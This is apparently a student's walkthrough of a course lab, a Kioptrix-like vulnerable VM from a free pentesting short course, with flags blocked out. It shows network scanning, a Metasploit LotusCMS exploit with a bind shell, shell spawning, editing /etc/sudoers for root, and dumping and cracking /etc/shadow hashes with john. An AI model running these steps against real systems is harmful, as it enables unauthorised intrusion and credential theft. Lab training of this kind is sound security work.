# charles-sturt-shortcourse-pentesting-walkthrough
IT Masters offered a free penetration testing course: https://itmasters.edu.au/free-short-course-pen-testing/. The final exam included solving a vulnerable box which was almost identical to #kioptrix(level 3)

University Name: Charles Sturt University, Australia
Instructed by: Chantelle Hale
Co-ordinated by: Jeremy Koster
Course Name: Pentesting
To protect course integrity, I blocked all the flags and answers in the walkthrough.

## Walkthrough
<h3> Setting up the VM:</h3>
Download the image file from IT masters website: https://learn.itmasters.edu.au/course/view.php?id=3807. Then import and run!

<h3>Getting into the environment:</h3>
Run netdiscover to learn the machine IP.

`sudo netdiscover -i eth0`

![image](https://user-images.githubusercontent.com/31168741/201129984-b84d673e-b85e-4ca8-a0b3-0a9025f63421.png)

Note: Found out by the mac address.

Run nmap scan on the machine IP that we found.

`sudo nmap -sS -A -p- [machine-ip] -T4`

![image](https://user-images.githubusercontent.com/31168741/201187255-88db250f-8258-4a4e-bfa6-1a196839f11b.png)

We find two ports open as per the results. Port 80 and 22

Since http service is running on the machine, run nikto to scan:

`nikto -h [machine-ip]`

![image](https://user-images.githubusercontent.com/31168741/201187786-b6f4ed90-5c1b-4f57-a6f0-5e1a122c0111.png)

Just as before, letâ€™s take a deeper dive by inspecting what lies in the open port i.e. ***[machine-ip]***:80

![image](https://user-images.githubusercontent.com/31168741/201187946-6c30ca06-9420-4597-8681-5137a596ca54.png)

***Flag 1 found!***

![image](https://user-images.githubusercontent.com/31168741/201188119-372aac15-cfdd-42b8-b7de-f9789d0f4828.png)

Then, a login form. Interesting!

<h3>Exploitation</h3>
As it says, the website is using lotuscms, let's see if anything we can find on this:

`searchsploit lotuscms`

![image](https://user-images.githubusercontent.com/31168741/201188633-633edac9-7b84-46d9-ba03-485e0076a659.png)

We try the one with Metasploit:

![image](https://user-images.githubusercontent.com/31168741/201188708-f9385b85-0f54-497e-9c70-ded7dd5149e5.png)

***Setting up the options:***

`set RHOSTS 192.168.31.32`<br>
`set URI /index.php?system=Admin`<br>
`set payload payload/generic/shell_bind_tcp`<br>
`exploit`

![image](https://user-images.githubusercontent.com/31168741/201188984-5b9d3f6e-f630-4b49-aff6-d613ae45cd49.png)
![image](https://user-images.githubusercontent.com/31168741/201189609-3f503ea7-c3e7-412c-b093-44df08146237.png)

We are inside! A session has been opened.<br>
Spawn tty shell for better user interaction.

`python -c 'import pty; pty.spawn("/bin/sh")'`

![image](https://user-images.githubusercontent.com/31168741/201190021-2fbd433c-0feb-4b63-8046-843c561f6b02.png)

Run bash: `/bin/bash -i` for even better user interaction.

![image](https://user-images.githubusercontent.com/31168741/201190262-d35f9042-bf2d-491a-9073-09e0590060ce.png)

Look around for clues.

![image](https://user-images.githubusercontent.com/31168741/201190354-e607265b-63cd-4bef-8006-b0555bda9847.png)

***Flag 2 found!***

Now looking into directories for more clues.

![image](https://user-images.githubusercontent.com/31168741/201190560-d415cd4a-9112-4dbe-a969-2d258d807a73.png)

A conguration file hmm! Let's look into **gconfig.php**

![image](https://user-images.githubusercontent.com/31168741/201190655-851b44e6-4963-4937-a5f0-19ff2acca663.png)

Found credential to sql server. Let's see what's in there!

![image](https://user-images.githubusercontent.com/31168741/201190993-a46dbf49-e895-4a66-98a4-ab737e43d5b8.png)
![image](https://user-images.githubusercontent.com/31168741/201191035-b1a74e0c-6808-4f37-a036-88ea69c55c5e.png)

User accounts and their hashed passwords. Crack the passwords using any kali cracking tools or any online tools.

![image](https://user-images.githubusercontent.com/31168741/201191268-75c7f93f-f2c8-4f25-bd84-1dcb5171bf13.png)

After learning passwords, we try to login to the user accounts accordingly using ssh.

![image](https://user-images.githubusercontent.com/31168741/201191694-b33d59ea-5642-4f99-9dc0-aca7d9fd1aa2.png)

Oops! ssh login was turned off for this machine. Change user to **dreg** in the previous found metasploit session with cracked credential.

![image](https://user-images.githubusercontent.com/31168741/201192068-5347b5ea-69a1-44b2-953a-57f6cc494002.png)

Let's look around for clues.

![image](https://user-images.githubusercontent.com/31168741/201192251-a6683e3c-8638-4d21-9a2e-93304eb44644.png)
![image](https://user-images.githubusercontent.com/31168741/201192323-02c44eda-11c4-4158-b6b3-bd086fb1111f.png)

Unfortunately, we didn't find anything beneficial here. Now, changing user to **loneferret**:

![image](https://user-images.githubusercontent.com/31168741/201192616-90938e87-599e-4dd7-80e0-7104a9c2f719.png)
![image](https://user-images.githubusercontent.com/31168741/201192645-0c30acc3-65ab-4360-ab3f-7512e5ac7d9a.png)
![image](https://user-images.githubusercontent.com/31168741/201192701-2ebfd206-0b31-435f-ae0e-5c3b1b9dfed2.png)

Well, well! Some clues. Let's run `sudo ht` as mentioned here.

![image](https://user-images.githubusercontent.com/31168741/201192776-4ae8cb41-31df-4907-addc-a33040c413e7.png)

Encountered errors but fixed with `export TERM=xterm`. Again opening the file lets us edit. Enter into the ***/etc/sudoers*** by function keys as is navigated below.

![image](https://user-images.githubusercontent.com/31168741/201193266-73f25b7c-6a08-449b-83ee-a114662c74f8.png)

Adding 3 more permissions in the highlighted portion: ***/bin/bash***, ***/bin/sh***, ***/bin/su***. Save and exit. Entering super user: `sudo su`

![image](https://user-images.githubusercontent.com/31168741/201193765-3330caca-bef9-4025-8087-0def5011d734.png)

Gained root privileges.<br>
***Flag 3 found!***

Look into ***/etc/passwd*** and ***/etc/shadow*** to get hashed password of the root account using `cat /etc/passwd` and `cat /etc/shadow` accordingly.

![image](https://user-images.githubusercontent.com/31168741/201194670-e94136c7-67ec-4e57-9069-c31b74dcfc7a.png)
![image](https://user-images.githubusercontent.com/31168741/201194702-f87957b4-716b-4f6e-a111-c0b0ad669183.png)

On host machine, make two text files with the information found from shadow and passwd.

![image](https://user-images.githubusercontent.com/31168741/201194871-4d2f8ca9-97fb-4cef-92a5-36b87bb8050c.png)

Combine the data of both files using unshadow: `unshadow passwd.txt shadow.txt > unshadow.txt`

![image](https://user-images.githubusercontent.com/31168741/201195040-fc1870fd-8888-4220-8d17-20a2a00638b9.png)

Cracking the hash using john the ripper tool: `john --wordlist=[wordlist_path] unshadow.txt`

![image](https://user-images.githubusercontent.com/31168741/201195218-cdb83365-ef5d-466e-abf2-657c91c79d16.png)

Encountered error at first but later fixed with the recommention mentioned alongside.

`john --wordlist=[wordlist_path] --format=md5crypt-long unshadow.txt`

And final flag root account password was found.<br>
***Flag 3 found!***
